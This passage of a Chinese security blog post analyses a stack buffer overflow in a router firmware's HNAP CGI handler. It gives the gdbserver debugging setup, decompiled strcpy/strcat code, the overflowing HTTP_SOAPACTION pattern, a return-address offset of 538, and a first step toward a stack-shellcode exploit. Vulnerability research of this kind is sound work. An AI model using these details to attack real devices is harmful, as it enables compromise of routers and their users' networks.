HTTP_SOAPACTION=&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaaf&quot;</span><br><span class="line">ProcNumber=`ps | grep gdbserver | grep -v grep | wc -l`</span><br><span class="line">source /firmadyne/setenv.sh</span><br><span class="line">while :</span><br><span class="line">do</span><br><span class="line">    echo $ProcNumber</span><br><span class="line">    if [ $ProcNumber -le 0 ];then</span><br><span class="line">        echo &quot;gdbserver not run&quot;</span><br><span class="line">        /firmadyne/gdbserver 0.0.0.0:12345 hnap hnap</span><br><span class="line">    else</span><br><span class="line">        echo &quot;gdbserver is running&quot;</span><br><span class="line">        sleep 5</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>运行的时候让脚本在后台运行，这样如果是因为 gdbserver 报错或者是卡住了，可以直接杀掉进程。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/firmadyne/checkgdb.sh &gt; ./log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>然后在宿主机中，使用 gdb-multiarch + pwndbg 设置远程调试，就可以愉快进行调试了。顺便说一下，pwngdb + tmux 是天作之合。</p>
<p><img src="/images/image-2023-0412-184251456.png" alt="undifined"></p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>当时在调试的时候，遇见的问题如下：</p>
<ol>
<li><p>cgibin</p>
<p>在 cgibin 的 main 函数中，先获取第一个运行参数到 v4，然后通过 strrchr检测 v4 中 &#x2F; 的位置并赋值给 v6。如果 &#x2F; 存在，那么将 v4 指向 &#x2F; 后的一个地址。为了方便，直接将 cgibin 程序名改为了 hnap，这样在调试的时候就直接在 main 函数中比较字符串跳转到调用 hnap_main 中了。关键反编译代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v4 = *argv;</span><br><span class="line">v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  v4 = v6 + <span class="number">1</span>;</span><br><span class="line">......</span><br><span class="line">  v36 = <span class="built_in">strcmp</span>(v4, <span class="string">&quot;hnap&quot;</span>);</span><br><span class="line">v8 = envp;</span><br><span class="line"><span class="keyword">if</span> ( !v36 )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = (<span class="type">int</span> (*)())hnap_main;</span><br><span class="line">  v10 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v9)(v10, argv, v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>gdbserver 设置环境变量</p>
<p>一开始自己是在 gdb-multiarch 中去设置环境变量，但是这样是设置到了宿主机的 gdb-multiarch 运行环境，正确的做法是设置到 gdbserver 的运行环境中，也就是上面在调试脚本中先设置了环境变量，然后再启动 gdbserver。简单说一下路由器环境中 cgi 调用的参数传递，一般都是在路由器的 server 例如 httpd、lighttpd 等通过设置环境变量的方式传递参数，然后调用 cgi 读取环境变量进行数据处理，再通过 stdout 将结果返回到 server中。</p>
</li>
</ol>
<p>设置好环境变量后，就可以开始进行调试了</p>
<p>通过分析可以知道如果要运行到存在漏洞 strcat 函数调用处，也就是 0x414A14 处如下，基本块的执行顺序是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00414A14 move    $a0, $s2         # dest</span><br><span class="line">.text:00414A18 lw      $gp, 0xD34+var_D14($sp)</span><br><span class="line">.text:00414A1C la      $t9, strcat</span><br><span class="line">.text:00414A20 jalr    $t9 ; strcat</span><br><span class="line">.text:00414A24 move    $a1, $s1         # src</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4141C4 -&gt; 0x4141E0 -&gt; 0x4141FC -&gt; 0x41431C -&gt; 0x414970 -&gt; 0x414978 -&gt; 0x414998 -&gt; 0x4149B4</span><br></pre></td></tr></table></figure>

<p>通过 cyclic 获取一个长度为 560 字节的字符串，然后赋值给 HTTP_SOAPACTION 环境变量，启动调试，运气比较不错直接可以执行到 0x4149B4。再打一个断点到最后 hnap_main 的结束处，就可以看到发生了栈溢出，返回地址已经被覆盖然后赋值给 ra 寄存器，PC 再从 ra 寄存器中取出来执行发生错误。</p>
<p><img src="/images/image-2023-0412-184309161.png" alt="undifined"></p>
<p>此处的计算出来的偏移是 538，因为 v74 是先将 v6（HTTP_HNAP_AUTH）通过空格分隔然后将第二部分固定的 10 个字节复制进去，然后才是通过 v4（HTTP_SOAPACTION）拼接，造成缓冲区溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(v58, v27 + <span class="number">4</span>, <span class="number">0xA</span>u);</span><br><span class="line">v28 = strtok(v6, <span class="string">&quot; &quot;</span>);                    <span class="comment">// v6 为 HTTP_HNAP_AUTH 环境变量，以空格分隔</span></span><br><span class="line">v29 = strtok(<span class="number">0</span>, <span class="string">&quot; &quot;</span>);                     <span class="comment">// v28 第一个部分</span></span><br><span class="line"><span class="built_in">strcpy</span>(v74, v29);                         <span class="comment">// v29 第二个部分</span></span><br><span class="line"><span class="built_in">strcat</span>(v74, v4);                          <span class="comment">// 上面的 strcpy 也存在缓冲区溢出</span></span><br></pre></td></tr></table></figure>

<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>分析完毕了，其实就是比较简单的一个缓冲区溢出漏洞，可以开始编写利用脚本了。</p>
<p>目标程序没有开启堆栈不可执行，就直接在栈上写代码吧，而且自己太菜，没有找到合适的控制 $r0 的 rop 控制链。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00415BCC jr      $ra</span><br><span class="line">.text:00415BD0 addiu   $sp, 0x1A8</span><br><span class="line">x/4c $sp + 0xD34 + 0x20</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://f5.pm/go-4502.html">https://f5.pm/go-4502.html</a></li>
<li>[路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析](路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析)</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">OneShell</p>
  <div class="site-description" itemprop="description">菜</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">OneShell</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


</body>
</html>
